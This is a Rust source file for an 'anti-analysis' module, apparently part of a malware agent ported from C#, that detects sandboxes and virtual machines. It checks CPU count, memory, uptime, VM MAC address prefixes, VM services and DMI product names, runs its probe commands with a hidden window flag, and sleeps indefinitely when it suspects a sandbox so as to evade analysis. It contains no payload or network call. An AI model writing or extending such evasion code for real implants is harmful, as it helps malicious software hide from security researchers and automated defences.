//! Anti-analysis module — VM detection, sandbox detection, environment probing.
//! Port of EnvironmentProbe.cs, SandboxDetector.cs, VmDetector.cs.

use std::process::Command;

/// Main entry point: returns true if it's safe to execute.
/// If a sandbox is detected, sleeps indefinitely and returns false.
pub fn should_execute() -> bool {
    if is_sandbox() {
        eprintln!("[Agent] Sandbox detected. Sleeping indefinitely.");
        std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        return false;
    }

    if is_virtual_machine() {
        eprintln!("[Agent] VM detected — may still execute depending on config.");
    }

    true
}

// ── Sandbox Detection ──────────────────────────────────────────────────

pub fn is_sandbox() -> bool {
    check_cpu_cores() || check_memory() || check_uptime()
}

fn check_cpu_cores() -> bool {
    match std::thread::available_parallelism() {
        Ok(n) => n.get() < 2,
        Err(_) => false,
    }
}

fn check_memory() -> bool {
    let sys = sysinfo::System::new_with_specifics(
        sysinfo::RefreshKind::nothing()
            .with_memory(sysinfo::MemoryRefreshKind::everything()),
    );
    let total_mb = sys.total_memory() / (1024 * 1024);
    total_mb < 2048
}

fn check_uptime() -> bool {
    let uptime = get_system_uptime_secs();
    uptime < 300 // Less than 5 minutes
}

fn get_system_uptime_secs() -> u64 {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = std::fs::read_to_string("/proc/uptime") {
            if let Some(uptime_str) = content.split_whitespace().next() {
                if let Ok(uptime) = uptime_str.parse::<f64>() {
                    return uptime as u64;
                }
            }
        }
        3600
    }
    #[cfg(target_os = "macos")]
    {
        use std::process::Command;
        if let Ok(output) = Command::new("sysctl").args(["-n", "kern.boottime"]).output() {
            let text = String::from_utf8_lossy(&output.stdout);
            // Format: { sec = 123456, usec = 789012 }
            if let Some(sec_start) = text.find("sec = ") {
                let rest = &text[sec_start + 6..];
                if let Some(sec_end) = rest.find(|c: char| !c.is_ascii_digit()) {
                    if let Ok(boot_time) = rest[..sec_end].parse::<u64>() {
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        return now.saturating_sub(boot_time);
                    }
                }
            }
        }
        3600
    }
    #[cfg(windows)]
    {
        // Use wmic to get system uptime on Windows
        if let Ok(output) = exec("wmic", &["os", "get", "lastbootuptime", "/format:csv"]) {
            // Parse the timestamp and compute diff
            if let Some(line) = output.lines().nth(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let boot_time = parts[1].trim();
                    if let Ok(bt) = parse_wmi_datetime(boot_time) {
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        return now.saturating_sub(bt);
                    }
                }
            }
        }
        3600
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        3600
    }
}

#[cfg(windows)]
fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
    // WMI datetime format: 20250612093015.500000+480
    if s.len() < 14 { return Err(()); }
    let year: i32 = s[0..4].parse().map_err(|_| ())?;
    let month: u32 = s[4..6].parse().map_err(|_| ())?;
    let day: u32 = s[6..8].parse().map_err(|_| ())?;
    let hour: u32 = s[8..10].parse().map_err(|_| ())?;
    let min: u32 = s[10..12].parse().map_err(|_| ())?;
    let sec: u32 = s[12..14].parse().map_err(|_| ())?;

    // Simple date-to-timestamp calculation
    let days_before_month: [u32; 12] = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
    let is_leap = |y: i32| y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
    let days_since_epoch = (year as u64 - 1970) * 365
        + (year as u64 - 1969) / 4
        - (year as u64 - 1901) / 100
        + (year as u64 - 1601) / 400
        + days_before_month[(month - 1) as usize] as u64
        + if month > 2 && is_leap(year) { 1 } else { 0 }
        + (day - 1) as u64;
    let secs_since_epoch = days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64;

    Ok(secs_since_epoch)
}

// ── VM Detection ───────────────────────────────────────────────────────

pub fn is_virtual_machine() -> bool {
    #[cfg(target_os = "windows")]
    {
        check_windows_vm()
    }
    #[cfg(not(target_os = "windows"))]
    {
        check_linux_vm()
    }
}

#[cfg(target_os = "windows")]
fn check_windows_vm() -> bool {
    // Check for VM MAC address prefixes via wmic
    if let Ok(output) = exec("wmic", &["nicconfig", "get", "macaddress"]) {
        let upper = output.to_uppercase();
        let vm_macs = ["00:05:69", "00:0C:29", "00:1C:42", "00:50:56", "08:00:27"];
        if vm_macs.iter().any(|m| upper.contains(m)) {
            return true;
        }
    }

    // Check for VM services
    if let Ok(svc) = exec("sc", &["query", "vmtools"]) {
        if svc.contains("RUNNING") {
            return true;
        }
    }
    if let Ok(svc) = exec("sc", &["query", "vboxservice"]) {
        if svc.contains("RUNNING") {
            return true;
        }
    }

    false
}

#[cfg(not(target_os = "windows"))]
fn check_linux_vm() -> bool {
    if let Ok(dmi) = exec(
        "/bin/sh",
        &["-c", "cat /sys/class/dmi/id/product_name 2>/dev/null"],
    ) {
        let lower = dmi.to_lowercase();
        let vm_keywords = ["virtualbox", "vmware", "kvm", "qemu", "xen"];
        if vm_keywords.iter().any(|k| lower.contains(k)) {
            return true;
        }
    }
    false
}

fn exec(cmd: &str, args: &[&str]) -> Result<String, ()> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let output = Command::new(cmd)
            .args(args)
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
            .map_err(|_| ())?;
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }
    #[cfg(not(windows))]
    {
        let output = Command::new(cmd)
            .args(args)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
            .map_err(|_| ())?;
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }
}
